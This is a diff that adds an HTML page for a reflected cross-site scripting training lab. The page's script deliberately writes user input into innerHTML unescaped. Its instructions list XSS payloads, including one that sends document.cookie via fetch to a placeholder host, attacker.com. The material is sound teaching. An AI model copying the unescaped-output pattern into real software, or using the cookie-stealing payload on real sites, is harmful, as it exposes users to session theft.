@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Reflected XSS Lab</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 50px;
+            background-color: #f0f0f0;
+        }
+        h1 {
+            color: #333;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        input[type="text"] {
+            width: 300px;
+            padding: 8px;
+            margin-right: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            padding: 8px 16px;
+            border: none;
+            background-color: #007BFF;
+            color: #fff;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .output {
+            margin-top: 20px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            background-color: #f9f9f9;
+            border-radius: 4px;
+        }
+        .alert {
+            color: #721c24;
+            background-color: #f8d7da;
+            border: 1px solid #f5c6cb;
+            padding: 10px;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Reflected XSS Lab</h1>
+        <p>Enter your name to get a personalized greeting:</p>
+        <form id="xssForm">
+            <input type="text" id="name" name="name" placeholder="Enter your name">
+            <button type="submit">Submit</button>
+        </form>
+
+        <div class="output" id="output"></div>
+
+        <div class="instructions">
+            <h2>Instructions</h2>
+            <p>To test for reflected XSS, enter the following payloads into the input field:</p>
+            <ul>
+                <li><strong>Basic Alert:</strong> <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
+                <li><strong>Image Payload:</strong> <code>&lt;img src="x" onerror="alert('XSS')"&gt;</code></li>
+                <li><strong>Event Handler:</strong> <code>&lt;input type="text" onfocus="alert('XSS')" autofocus&gt;</code></li>
+                <li><strong>Stealing Cookies:</strong> <code>&lt;script&gt;fetch('https://attacker.com/steal?cookie=' + document.cookie)&lt;/script&gt;</code></li>
+            </ul>
+            <p><strong>Note:</strong> The payloads above are for demonstration purposes. Always ensure that you have permission to test for vulnerabilities on any system.</p>
+        </div>
+    </div>
+
+    <script>
+        // Get the form and output elements
+        const form = document.getElementById('xssForm');
+        const outputDiv = document.getElementById('output');
+
+        // Handle form submission
+        form.addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent page reload
+
+            // Get the user input
+            const name = document.getElementById('name').value;
+
+            // Reflect the input in the output div
+            // Note: This is where the XSS vulnerability is simulated
+            outputDiv.innerHTML = `<h2>Hello, ${name}!</h2>`;
+        });
+    </script>
+</body>
+</html>
